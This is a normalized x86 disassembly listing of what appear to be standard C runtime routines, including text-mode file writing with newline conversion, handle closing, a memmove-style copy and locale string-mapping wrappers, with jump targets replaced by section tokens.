test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x1c
call sub_200fb26
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_200fb39
pop ecx
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_20145cd
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_2022aad
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_2022d6e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_2022d6e
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_2022aad
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_2013d2d
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20135fa
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2013dff
mov eax [ ebp - 0x1c ]
sub_2013e10
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_2013e98 ]
jmp [ ecx * 4 + jump_table_2013f18 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2013f84 ]
pop esi
pop edi
pop ebp
jmp sub_2022e42
jmp [ ecx * 4 + jump_table_2014120 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_2014024 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2014120 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_2013f84 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_2014120 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2013f84 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2013f84 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2013f84 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2014120 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2014120 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2014120 ]
sub_201418b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_2009d98
pop ecx
sub_20141ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_2022f25
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_200b53e
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_2022f6e
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_2009d98
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_2009d98
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_201418b
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_2009eef
pop ecx
cmp eax ebx
je r-xdata
call sub_2023130
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_2013580
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_2022f6e
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_2009eef
pop ecx
cmp eax ebx
je r-xdata
call sub_2023130
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_201418b
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_201418b
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_2009eef
pop ecx
cmp eax ebx
je r-xdata
call sub_2023130
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_2014550
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_20141ab
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2014595
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_20147e0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x107
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_201480a
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_2014830
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x103
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_201485a
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_20231e6
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_2014880
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_20099ee
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_2014595
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_201ac89
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_2014938
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_201496a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_202251a
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_200fb39
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_202251a
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_202251a
push 0x1
mov edi eax
call sub_202251a
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_2022494
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_2014a06
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_200fb13
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_201496a
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2014ac9
mov eax [ ebp - 0x1c ]
sub_2014ad3
mov edi edi
